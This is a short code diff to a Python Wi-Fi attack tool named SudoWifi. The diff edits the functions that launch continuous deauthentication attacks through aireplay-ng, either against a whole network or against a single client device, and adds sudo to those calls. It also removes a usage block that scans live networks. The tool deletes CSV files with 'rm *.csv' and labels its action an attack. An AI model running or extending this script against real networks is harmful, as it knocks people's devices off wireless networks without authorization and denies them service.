@@ -218,15 +218,9 @@ class SudoWifi:
             os.system("rm *.csv")
             print(f"Deauth {device_mac} from {network_mac} using aireplay")
             print(f"\033[93m(\033[91mCTRL+C\033[93m) to stop attack") 
-            os.system(f"aireplay-ng --deauth 0 -D -a {network_mac} {interface}")
+            os.system(f"sudo aireplay-ng --deauth 0 -D -a {network_mac} {interface}")
         else :
             os.system("rm *.csv")
             print(f"Deauth {device_mac} from {network_mac} using aireplay ...")
             print(f"\033[93m(\033[91mCTRL+C\033[93m) to stop attack")
-            os.system(f"aireplay-ng --deauth 0 -D -a {network_mac} -c {device_mac} {interface}")
-if __name__ == "__main__":
-    # Usage
-    wifi_interface = 'wlan0'  # Replace with your Wi-Fi interface in monitor mode
-    scanner = SudoWifi()
-    scanner.scan_live_networks(wifi_interface)
-
+            os.system(f"sudo aireplay-ng --deauth 0 -D -a {network_mac} -c {device_mac} {interface}")
